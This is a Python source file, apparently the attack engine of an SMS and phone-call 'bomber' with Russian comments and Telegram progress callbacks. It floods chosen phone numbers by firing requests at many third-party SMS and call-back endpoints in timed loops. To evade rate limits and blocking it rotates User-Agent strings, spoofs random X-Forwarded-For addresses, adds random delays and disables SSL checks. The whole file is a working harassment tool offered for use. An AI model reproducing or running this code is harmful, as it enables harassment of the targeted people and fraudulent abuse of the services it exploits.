from asyncio import ensure_future, gather, run
from aiohttp import ClientSession, ClientTimeout
import asyncio
import time
import random
import threading

from Core.Attack.Services import urls
from Core.Attack.Services_Extra import extra_urls
from Core.Attack.ServiceRegistry import record_result, is_enabled, _is_stopped as registry_stopped

# Флаг остановки (threading-safe)
_stop_lock = threading.Lock()
_stop_flag = False
# Callback для отправки статистики в Telegram
_progress_callback = None

def set_progress_callback(cb):
    global _progress_callback
    _progress_callback = cb

def _is_stopped():
    with _stop_lock:
        return _stop_flag

def _set_stopped(val=True):
    global _stop_flag
    with _stop_lock:
        _stop_flag = val

# Ротация User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 Chrome/111.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,6; iOS 16.2) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Xiaomi 12) AppleWebKit/537.36 Chrome/108.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone15,3; iOS 17.0) AppleWebKit/605.1.15 Mobile/15E148",
]

async def request(session, url, attack_type, number):
    try:
        if _is_stopped():
            return None

        if attack_type == "MIX":
            allowed = ("SMS", "CALL")
        elif attack_type == "SMS":
            allowed = ("SMS",)
        elif attack_type == "CALL":
            allowed = ("CALL",)
        else:
            allowed = ("SMS", "CALL")

        if url['info']['attack'] not in allowed:
            return None

        # Случайная задержка 100-500ms
        delay = random.uniform(0.1, 0.5)
        await asyncio.sleep(delay)

        # Ротация User-Agent
        headers = url.get('headers', {}).copy()
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['Accept-Language'] = random.choice(['ru-RU,ru;q=0.9', 'en-US,en;q=0.8', 'ru,en;q=0.9'])
        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        headers['Cache-Control'] = 'no-cache'
        headers['Pragma'] = 'no-cache'

        timeout = ClientTimeout(total=15)
        start_t = time.time()

        method = url.get('method', 'post').lower()
        request_url = url['url']
        
        # Подставляем номер в URL если есть placeholder
        if '{number}' in request_url:
            request_url = request_url.replace('{number}', number)

        async with session.request(
            method,
            request_url,
            params=url.get('params'),
            cookies=url.get('cookies'),
            headers=headers,
            data=url.get('data'),
            json=url.get('json'),
            timeout=timeout,
            ssl=False,
        ) as response:
            resp_time = time.time() - start_t
            status = response.status
            success = status < 400
            record_result(url, success=success, response_time=resp_time)
            return status

    except asyncio.TimeoutError:
        record_result(url, success=False, response_time=15)
    except Exception:
        record_result(url, success=False)
    return None

async def async_attacks(numbers, attack_type, country_filter='ALL'):
    """Атакует один или несколько номеров"""
    all_services = urls(numbers[0]) + extra_urls(numbers[0])
    
    # Если несколько номеров — дублируем сервисы для каждого
    if len(numbers) > 1:
        extra = []
        for n in numbers[1:]:
            for s in urls(n) + extra_urls(n):
                extra.append(s)
        all_services.extend(extra)

    # Фильтруем по типу атаки, стране и статусу
    allowed_types = {"MIX": ("SMS", "CALL"), "SMS": ("SMS",), "CALL": ("CALL",)}
    atypes = allowed_types.get(attack_type, ("SMS", "CALL"))
    
    services = [s for s in all_services 
                if s['info']['attack'] in atypes 
                and is_enabled(s)
                and (country_filter == 'ALL' or s['info'].get('country', 'ALL') == country_filter)]
    
    if not services:
        return {"total": 0, "success": 0, "fail": 0}

    timeout = ClientTimeout(total=30)
    async with ClientSession(timeout=timeout) as session:
        tasks = []
        for s in services:
            tasks.append(ensure_future(request(session, s, attack_type, s.get('data', {}).get('phone', numbers[0]))))
        
        results = await gather(*tasks, return_exceptions=True)
        
        ok = sum(1 for r in results if r is not None and isinstance(r, int) and r < 400)
        fail = sum(1 for r in results if r is None or (isinstance(r, int) and r >= 400))
        
        return {"total": len(tasks), "success": ok, "fail": fail}

def start_async_attacks(numbers, minutes, attack_type="MIX", stop_previous=False, progress_callback=None, country_filter="ALL"):
    """Запуск атаки с прогрессом"""
    import time as tm
    
    if stop_previous:
        tm.sleep(0.5)
        _set_stopped(False)
    
    if progress_callback:
        set_progress_callback(progress_callback)
    
    start_time = tm.time()
    duration = float(minutes) * 60
    cycle = 0
    
    while True:
        if _is_stopped():
            break
        elapsed = tm.time() - start_time
        if elapsed >= duration:
            break
        
        cycle += 1
        result = run(async_attacks(numbers, attack_type, country_filter))
        
        # Отправляем прогресс каждые 5 циклов
        if progress_callback and cycle % 5 == 0:
            elapsed_str = f"{int(elapsed // 60)}:{int(elapsed % 60):02d}"
            progress_callback(
                f"⏱ Прошло: {elapsed_str} / {minutes} мин.\n"
                f"🔄 Циклов: {cycle}\n"
                f"✅ Успешно: {result.get('success', 0)}\n"
                f"❌ Ошибок: {result.get('fail', 0)}"
            )

def stop_attacks():
    _set_stopped(True)
